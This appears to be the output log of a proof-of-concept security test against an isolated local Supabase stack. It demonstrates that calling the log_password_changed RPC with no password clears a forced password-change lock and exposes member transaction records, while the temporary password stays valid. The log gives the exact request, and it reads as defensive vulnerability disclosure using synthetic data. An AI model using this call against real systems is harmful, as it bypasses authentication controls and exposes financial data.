=== BKC-01 end-to-end over the Supabase REST API (isolated local stack) ===

[1] Sign in as the synthetic member who is still on the staff-issued temporary password
    signed in OK (access token obtained with the TEMPORARY password)

[2] my_session() — the app sees the forced-change lock
    must_change_password = true | role = member | member = BND26002

[3] BEFORE the exploit — try to read member data
    GET /rest/v1/transactions  -> []

[4] THE EXPLOIT — POST /rest/v1/rpc/log_password_changed  (no password supplied)
    HTTP status: 204

[5] AFTER the exploit — my_session() and member data, same token, same password
    must_change_password = false | password_set = true
    GET /rest/v1/transactions  -> [{"reference":"FEE261022002","amount":20000.00}, 
 {"reference":"SHR261022002","amount":200000.00}, 
 {"reference":"SAV261022012","amount":100000.00}, 
 {"reference":"SAV261022013","amount":73500.00}, 
 {"reference":"SAV261022014","amount":30000.00}]

[6] The temporary password is STILL the live credential — sign in again with it
    re-sign-in with the temporary password: SUCCEEDED
